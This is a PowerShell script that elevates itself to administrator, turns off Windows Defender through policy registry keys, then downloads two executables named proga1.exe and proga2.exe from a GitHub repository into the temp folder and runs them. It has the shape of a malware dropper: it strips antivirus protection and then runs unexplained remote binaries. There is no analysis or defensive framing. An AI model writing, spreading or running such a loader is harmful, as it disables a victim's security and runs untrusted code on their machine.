Param([switch]$shouldAssumeToBeElevated, [String]$workingDirOverride)

if(-not($PSBoundParameters.ContainsKey('workingDirOverride'))) { $workingDirOverride = (Get-Location).Path }

function Test-Admin {
    $currentUser = New-Object Security.Principal.WindowsPrincipal $([Security.Principal.WindowsIdentity]::GetCurrent())
    $currentUser.IsInRole([Security.Principal.WindowsBuiltinRole]::Administrator)
}

if ((Test-Admin) -eq $false) {
    if ($shouldAssumeToBeElevated) {
        Write-Output "Elevating did not work :("
        exit
    } else {
        Start-Process powershell.exe -Verb RunAs -ArgumentList ('-noprofile -file "{0}" -shouldAssumeToBeElevated -workingDirOverride "{1}"' -f ($myinvocation.MyCommand.Definition, "$workingDirOverride"))
    }
    exit
}

Set-Location "$workingDirOverride"

# 1. ОТКЛЮЧЕНИЕ DEFENDER
Write-Host "=== Disabling Windows Defender ===" -ForegroundColor Yellow

$DefenderPath = "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender"
$RealTimeProtectionKey = "Real-Time Protection"

if (!(Test-Path $DefenderPath)) { New-Item -Path $DefenderPath -Force }
New-Item -Path "$DefenderPath\$RealTimeProtectionKey" -Force -ErrorAction SilentlyContinue

Set-ItemProperty -Path $DefenderPath -Name "DisableAntiSpyware" -Value 1 -Type DWord -Force -ErrorAction SilentlyContinue
Set-ItemProperty -Path $DefenderPath -Name "DisableAntiVirus" -Value 1 -Type DWord -Force -ErrorAction SilentlyContinue

Write-Host "Windows Defender DISABLED" -ForegroundColor Green

# 2. СКАЧИВАНИЕ И ЗАПУСК ФАЙЛОВ ЧЕРЕЗ CURL
Write-Host ""
Write-Host "=== Downloading and Running Files ===" -ForegroundColor Yellow

$temp = $env:TEMP

# Первый файл
Write-Host "[1/2] Downloading proga1.exe..." -ForegroundColor Cyan
curl.exe -L -o "$temp\proga1.exe" "https://github.com/slavicNoCheater2/network/raw/refs/heads/main/proga1.exe"
if (Test-Path "$temp\proga1.exe") {
    Write-Host "SUCCESS: proga1.exe downloaded" -ForegroundColor Green
    Write-Host "Running proga1.exe..." -ForegroundColor Green
    Start-Process -FilePath "$temp\proga1.exe"
} else {
    Write-Host "FAILED: proga1.exe not downloaded" -ForegroundColor Red
}

# Второй файл
Write-Host "[2/2] Downloading proga2.exe..." -ForegroundColor Cyan
curl.exe -L -o "$temp\proga2.exe" "https://github.com/slavicNoCheater2/network/raw/refs/heads/main/proga2.exe"
if (Test-Path "$temp\proga2.exe") {
    Write-Host "SUCCESS: proga2.exe downloaded" -ForegroundColor Green
    Write-Host "Running proga2.exe..." -ForegroundColor Green
    Start-Process -FilePath "$temp\proga2.exe"
} else {
    Write-Host "FAILED: proga2.exe not downloaded" -ForegroundColor Red
}

Write-Host ""
Write-Host "=== ALL DONE ===" -ForegroundColor Green
Write-Host ""
Write-Host "Press Enter to exit..."
Read-Host
